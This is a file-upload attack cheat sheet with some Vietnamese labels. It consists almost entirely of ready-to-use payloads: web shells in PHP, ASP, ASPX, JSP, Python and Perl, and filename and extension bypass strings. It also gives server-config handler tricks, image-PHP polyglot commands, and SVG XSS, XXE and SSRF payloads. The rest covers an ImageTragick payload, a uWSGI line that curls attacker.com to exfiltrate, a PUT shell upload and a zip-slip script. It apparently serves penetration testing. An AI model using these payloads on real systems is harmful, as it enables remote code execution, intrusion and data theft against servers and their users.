# File Upload — Payloads & Cheatsheet

## Web Shell One-liners

### PHP

```php
<?php system($_GET['cmd']); ?>
```

```php
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

```php
<?php if($_POST){system($_POST['cmd']);} ?>
```

```php
<?php passthru($_GET['cmd']); ?>
```

### ASP Classic

```asp
<% Set o = Server.CreateObject("WScript.Shell"): Set r = o.Exec("cmd /c " & Request("cmd")): Response.Write(r.StdOut.ReadAll()) %>
```

### ASPX

```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% Process.Start(new ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd() %>
```

### JSP

```jsp
<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(request.getParameter("cmd")); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=br.readLine())!=null) out.println(l); %>
```

### Python CGI

```python
#!/usr/bin/python
import os,cgi; f=cgi.FieldStorage(); print("Content-Type:text/plain\n\n"+os.popen(f.getvalue('cmd','id')).read())
```

### Perl CGI

```perl
#!/usr/bin/perl
use CGI;print CGI->new->header,`${\(CGI->new->param('cmd')||'id')}`;
```

## Extension Lists

### PHP Executable Extensions

```
.php    .php2   .php3   .php4   .php5   .php6   .php7
.phps   .pht    .phtm   .phtml  .pgif   .shtml
.phar   .inc    .hphp   .ctp    .module
```

### ASP/ASP.NET Executable Extensions

```
.asp    .aspx   .config .ashx   .asmx   .aspq   .axd
.cshtm  .cshtml .rem    .soap   .vbhtm  .vbhtml
.asa    .cer    .shtml
```

### Java Executable Extensions

```
.jsp    .jspx   .jsw    .jsv    .jspf   .wss    .do     .action
```

### Other

```
.cfm    .cfml   .cfc    .dbm        (ColdFusion)
.pl     .cgi                         (Perl)
.py     .cgi                         (Python)
.swf                                 (Flash)
.yaws                                (Erlang)
```

## Magic Bytes / File Signatures

| Format        | Hex                       | Printable           |
| ------------- | ------------------------- | ------------------- |
| PNG           | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| JPEG/JPG      | `FF D8 FF`                | `ÿØÿ`               |
| GIF87a        | `47 49 46 38 37 61`       | `GIF87a`            |
| GIF89a        | `47 49 46 38 39 61`       | `GIF89a`            |
| BMP           | `42 4D`                   | `BM`                |
| PDF           | `25 50 44 46 2D`          | `%PDF-`             |
| ZIP/DOCX/XLSX | `50 4B 03 04`             | `PK\x03\x04`        |
| RAR           | `52 61 72 21`             | `Rar!`              |
| TIFF (LE)     | `49 49 2A 00`             | `II*\x00`           |
| TIFF (BE)     | `4D 4D 00 2A`             | `MM\x00*`           |
| EXE/DLL       | `4D 5A`                   | `MZ`                |
| ELF           | `7F 45 4C 46`             | `\x7fELF`           |
| GZIP          | `1F 8B`                   | —                   |

Danh sách đầy đủ: [Wikipedia — List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)

## Extension Bypass Payloads

### Null Byte

```
shell.php%00.jpg
shell.php\x00.jpg
shell.asp%00.png
```

### Special Characters

```
shell.php%20
shell.php%0a
shell.php%0d%0a
shell.php.
shell.php....
shell.php/
shell.php.\
```

### Double Extension

```
shell.php.jpg
shell.php.png
shell.jpg.php
shell.png.php5
shell.png.phtml
shell.png.jpg.php
```

### Case Manipulation

```
shell.pHp
shell.PhP5
shell.pHP
shell.Php
shell.pHtMl
```

### Recursive Strip Bypass

```
shell.p.phphp       → strip ".php" → shell.php
shell.pphphp        → strip ".php" → shell.php
shell..telerik.asp
```

### ADS (Windows)

```
shell.asp::$data
shell.asp::$data.
shell.asax:.jpg
```

### Semicolon (IIS6)

```
shell.asp;.jpg
shell.asp;.png
```

## Config File Payloads

### .htaccess

```apache
AddType application/x-httpd-php .evil
```

```apache
SetHandler application/x-httpd-php
```

```apache
AddHandler application/x-httpd-php .jpg
```

### .user.ini

```ini
auto_prepend_file=shell.jpg
```

### web.config (ASP Handler)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.webServer>
<handlers>
<add name="evil" path="*.evil" verb="*" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified"/>
</handlers>
</system.webServer>
</configuration>
```

## Polyglot Construction

### GIF + PHP

```bash
echo -n 'GIF89a' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### JPEG + PHP (via EXIF)

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg -o shell.php.jpg
```

### PNG + PHP (prepend)

```bash
printf '\x89PNG\r\n\x1a\n' > shell.php
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

### GIF Comment Injection

```bash
gifsicle < legit.gif --comment "<?php system(\$_GET['cmd']); ?>" > shell.php.gif
```

## SVG Payloads

### XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
```

### XXE

```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

### SSRF

```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg xmlns="http://www.w3.org/2000/svg"><text>&ssrf;</text></svg>
```

## ImageTragick Payload

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|COMMAND_HERE|touch "x)'
pop graphic-context
```

## Filename Injection Payloads

| Attack         | Filename                    |
| -------------- | --------------------------- |
| SQLi           | `sleep(10)-- -.jpg`         |
| CMDi           | `; sleep 10;.jpg`           |
| XSS            | `<svg onload=alert(1)>.svg` |
| SSTI           | `{{7*7}}.jpg`               |
| Path Traversal | `../../../etc/passwd`       |

## uWSGI Config Payload

```ini
[uwsgi]
body = @(exec://whoami)
extra = @(exec://curl http://attacker.com/exfil)
```

## Upload via PUT

```http
PUT /images/shell.php HTTP/1.1
Host: target.com
Content-Type: application/x-httpd-php

<?php system($_GET['cmd']); ?>
```

## Zip Slip Payload (Python)

```python
import zipfile
from io import BytesIO

f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/shell.php',
           '<?php system($_REQUEST["cmd"]); ?>')
z.close()
open('exploit.zip','wb').write(f.getvalue())
```

## Symlink Archive

```bash
ln -s ../../../etc/passwd link.txt
zip --symlinks exploit.zip link.txt
```

## Quick Reference: Content-Type Spoofing

| MIME Type                  | Mô tả            |
| -------------------------- | ---------------- |
| `image/jpeg`               | JPEG image       |
| `image/png`                | PNG image        |
| `image/gif`                | GIF image        |
| `image/svg+xml`            | SVG              |
| `text/plain`               | Plain text       |
| `application/pdf`          | PDF              |
| `application/octet-stream` | Binary (generic) |
| `application/zip`          | ZIP archive      |
| `text/html`                | HTML             |

## Tools

| Tool                                                                             | Mục đích                             |
| -------------------------------------------------------------------------------- | ------------------------------------ |
| Burp Suite                                                                       | Intercept/modify upload requests     |
| [Upload Scanner (Burp extension)](https://github.com/PortSwigger/upload-scanner) | Automated file upload testing        |
| [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass)                        | Automated bypass testing             |
| ExifTool                                                                         | Inject metadata/payload vào ảnh      |
| gifsicle                                                                         | GIF comment manipulation             |
| evilarc                                                                          | Create malicious archives (zip slip) |
| Metasploit                                                                       | Filename pattern generation          |
